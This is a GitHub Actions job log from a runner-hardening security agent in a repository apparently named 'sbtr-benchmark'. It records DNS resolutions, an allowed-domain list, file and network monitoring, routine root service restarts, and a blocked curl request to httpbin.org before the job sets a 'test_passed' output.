+2026-04-02T19:45:55.5627160Z Thu, 02 Apr 2026 19:45:48 GMT:NewAuditClient created
+2026-04-02T19:45:55.5627698Z Thu, 02 Apr 2026 19:45:48 GMT:Status is enabled
+2026-04-02T19:45:55.5628508Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: codeload.github.com., ip address: 140.82.112.9, TTL: 60
+2026-04-02T19:45:55.5629936Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: actions-results-receiver-production.githubapp.com., ip address: 140.82.113.23, TTL: 60
+2026-04-02T19:45:55.5631406Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: agent.api.stepsecurity.io., ip address: 184.33.103.14, TTL: 57
+2026-04-02T19:45:55.5632515Z Thu, 02 Apr 2026 19:45:48 GMT:Rules deleted
+2026-04-02T19:45:55.5633229Z Thu, 02 Apr 2026 19:45:48 GMT:File monitor added for /home/runner/work/sbtr-benchmark/sbtr-benchmark
+2026-04-02T19:45:55.5634009Z Thu, 02 Apr 2026 19:45:48 GMT:Agent file monitor added
+2026-04-02T19:45:55.5634596Z Thu, 02 Apr 2026 19:45:48 GMT:Docker's daemon.json file monitor added
+2026-04-02T19:45:55.5635240Z Thu, 02 Apr 2026 19:45:48 GMT:Systemd's resolved.conf file monitor added
+2026-04-02T19:45:55.5635846Z Thu, 02 Apr 2026 19:45:48 GMT:Net monitor added for TCP (connect)
+2026-04-02T19:45:55.5636498Z Thu, 02 Apr 2026 19:45:48 GMT:Net monitor added for UDP (sendto & sendmsg)
+2026-04-02T19:45:55.5637413Z Thu, 02 Apr 2026 19:45:48 GMT:Process monitor added
+2026-04-02T19:45:55.5637879Z Thu, 02 Apr 2026 19:45:48 GMT:receive called
+2026-04-02T19:45:55.5638200Z 
+2026-04-02T19:45:55.5638587Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: api.github.com., ip address: 140.82.114.6, TTL: 60
+2026-04-02T19:45:55.5639747Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: productionresultssa4.blob.core.windows.net., ip address: 57.150.27.1, TTL: 30
+2026-04-02T19:45:55.5641050Z Thu, 02 Apr 2026 19:45:48 GMT:domain resolved: github.com., ip address: 140.82.114.3, TTL: 60
+2026-04-02T19:45:55.5641380Z 
+2026-04-02T19:45:55.5641495Z Thu, 02 Apr 2026 19:45:48 GMT:updated resolved
+2026-04-02T19:45:55.5641706Z 
+2026-04-02T19:45:55.5641809Z Thu, 02 Apr 2026 19:45:52 GMT:set docker config
+2026-04-02T19:45:55.5642242Z 
+2026-04-02T19:45:55.5642247Z 
+2026-04-02T19:45:55.5642959Z Thu, 02 Apr 2026 19:45:52 GMT:Allowed domains:map[api.github.com.:[{api.github.com. 443}] github.com.:[{github.com. 443}] productionresultssa4.blob.core.windows.net.:[{productionresultssa4.blob.core.windows.net. 443}]]
+2026-04-02T19:45:55.5643746Z 
+2026-04-02T19:45:55.5644067Z Thu, 02 Apr 2026 19:45:52 GMT:done
+2026-04-02T19:45:55.5645069Z Thu, 02 Apr 2026 19:45:53 GMT:[Source code overwritten] file: /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/config.lock syscall: openat by exe: /usr/bin/git [937a38d81bb3a821ca75e88cb007b8460af6dd6e9772cccd9cacf1ecab62edbc] Timestamp: 2026-04-02T19:45:53.091Z
+2026-04-02T19:45:55.5646800Z Thu, 02 Apr 2026 19:45:53 GMT:[Source code overwritten] file: /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/config syscall: rename by exe: /usr/bin/git [937a38d81bb3a821ca75e88cb007b8460af6dd6e9772cccd9cacf1ecab62edbc] Timestamp: 2026-04-02T19:45:53.091Z
+2026-04-02T19:45:55.5649082Z Thu, 02 Apr 2026 19:45:53 GMT:[Source code overwritten] file: /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/config.lock syscall: openat by exe: /usr/bin/git [937a38d81bb3a821ca75e88cb007b8460af6dd6e9772cccd9cacf1ecab62edbc] Timestamp: 2026-04-02T19:45:53.091Z
+2026-04-02T19:45:55.5651496Z Thu, 02 Apr 2026 19:45:53 GMT:[Source code overwritten] file: /home/runner/work/sbtr-benchmark/sbtr-benchmark/.git/config syscall: openat by exe: /home/runner/actions-runner/cached/2.333.1/externals/node20/bin/node [a03953a7b16bff002b94d6fb58ada900b68241cbcaee6efc400b20dadd36dddc] Timestamp: 2026-04-02T19:45:53.163Z
+2026-04-02T19:45:55.5653353Z Thu, 02 Apr 2026 19:45:53 GMT:endpoint called ip address:port 140.82.114.3:443, domain: github.com., pid: 2654, process: git-remote-http
+2026-04-02T19:45:55.5654213Z Thu, 02 Apr 2026 19:45:53 GMT:endpoint called ip address:port 140.82.114.6:443, domain: api.github.com., pid: 2677, process: curl
+2026-04-02T19:45:55.5655024Z Thu, 02 Apr 2026 19:45:53 GMT:endpoint called ip address:port 140.82.114.6:443, domain: api.github.com., pid: 2679, process: curl
+2026-04-02T19:45:55.5656004Z Thu, 02 Apr 2026 19:45:54 GMT:endpoint called ip address:port 140.82.114.6:443, domain: api.github.com., pid: 2681, process: curl
+2026-04-02T19:45:55.5656673Z Thu, 02 Apr 2026 19:45:54 GMT:domain not allowed: httpbin.org.
+2026-04-02T19:45:55.5657168Z Thu, 02 Apr 2026 19:45:54 GMT:ip address dropped: 54.185.253.63
+2026-04-02T19:45:55.5657711Z Thu, 02 Apr 2026 19:45:54 GMT:endpoint called ip address:port 54.185.253.63:443, domain: httpbin.org., pid: 2695, process: curl
+2026-04-02T19:45:55.5658387Z 
+2026-04-02T19:45:55.5658560Z Thu, 02 Apr 2026 19:45:54 GMT:post_event called
+2026-04-02T19:45:55.5659522Z Thu, 02 Apr 2026 19:45:54 GMT:domain resolved: results-receiver.actions.githubusercontent.com., ip address: 140.82.112.22, TTL: 30
+2026-04-02T19:45:55.5660265Z 
+2026-04-02T19:45:55.5660349Z status:
+2026-04-02T19:45:55.5660530Z Initialized
+2026-04-02T19:45:55.5779240Z agent.service log:
+2026-04-02T19:45:55.5780444Z Apr 02 19:45:48 runnervmrg6be systemd[1]: /etc/systemd/system/agent.service:9: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether.
+2026-04-02T19:45:55.5782480Z Apr 02 19:45:48 runnervmrg6be systemd[1]: /etc/systemd/system/agent.service:10: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether.
+2026-04-02T19:45:55.5783449Z Apr 02 19:45:48 runnervmrg6be systemd[1]: Started agent.service - Agent.
+2026-04-02T19:45:55.5784688Z Apr 02 19:45:48 runnervmrg6be sudo[2205]:     root : *** ; USER=root ; COMMAND=/usr/bin/systemctl stop systemd-resolved
+2026-04-02T19:45:55.5785393Z Apr 02 19:45:48 runnervmrg6be sudo[2205]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5786002Z Apr 02 19:45:48 runnervmrg6be sudo[2205]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5786706Z Apr 02 19:45:48 runnervmrg6be sudo[2211]:     root : *** ; USER=root ; COMMAND=/usr/bin/systemctl restart systemd-resolved
+2026-04-02T19:45:55.5787376Z Apr 02 19:45:48 runnervmrg6be sudo[2211]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5788165Z Apr 02 19:45:48 runnervmrg6be sudo[2211]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5788860Z Apr 02 19:45:48 runnervmrg6be sudo[2218]:     root : *** ; USER=root ; COMMAND=/usr/bin/resolvectl flush-caches
+2026-04-02T19:45:55.5789513Z Apr 02 19:45:48 runnervmrg6be sudo[2218]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5790111Z Apr 02 19:45:48 runnervmrg6be sudo[2218]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5790734Z Apr 02 19:45:48 runnervmrg6be sudo[2221]:     root : *** ; USER=root ; COMMAND=/usr/bin/systemctl reload docker
+2026-04-02T19:45:55.5791356Z Apr 02 19:45:48 runnervmrg6be sudo[2221]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5792172Z Apr 02 19:45:48 runnervmrg6be sudo[2221]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5792912Z Apr 02 19:45:48 runnervmrg6be sudo[2230]:     root : *** ; USER=root ; COMMAND=/usr/bin/systemctl daemon-reload
+2026-04-02T19:45:55.5793542Z Apr 02 19:45:48 runnervmrg6be sudo[2230]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5794612Z Apr 02 19:45:49 runnervmrg6be systemd[1]: /etc/systemd/system/agent.service:9: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether.
+2026-04-02T19:45:55.5796065Z Apr 02 19:45:49 runnervmrg6be systemd[1]: /etc/systemd/system/agent.service:10: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether.
+2026-04-02T19:45:55.5797084Z Apr 02 19:45:49 runnervmrg6be sudo[2230]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5797712Z Apr 02 19:45:49 runnervmrg6be sudo[2299]:     root : *** ; USER=root ; COMMAND=/usr/bin/systemctl restart docker
+2026-04-02T19:45:55.5798343Z Apr 02 19:45:49 runnervmrg6be sudo[2299]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+2026-04-02T19:45:55.5798933Z Apr 02 19:45:52 runnervmrg6be sudo[2299]: pam_unix(sudo:session): session closed for user root
+2026-04-02T19:45:55.5799248Z 
+2026-04-02T19:45:55.8111351Z Evaluate and set job outputs
+2026-04-02T19:45:55.8118397Z Set output 'test_passed'
+2026-04-02T19:45:55.8120076Z Cleaning up orphan processes
+2026-04-02T19:45:55.8477699Z ##[warning]Node.js 20 actions are deprecated. The following actions are running on Node.js 20 and may not work as expected: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11. Actions will be forced to run with Node.js 24 by default starting June 2nd, 2026. Node.js 20 will be removed from the runner on September 16th, 2026. Please check if updated versions of these actions are available that support Node.js 24. To opt into Node.js 24 now, set the FORCE_JAVASCRIPT_ACTIONS_TO_NODE24=true environment variable on the runner or in your workflow file. Once Node.js 24 becomes the default, you can temporarily opt out by setting ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
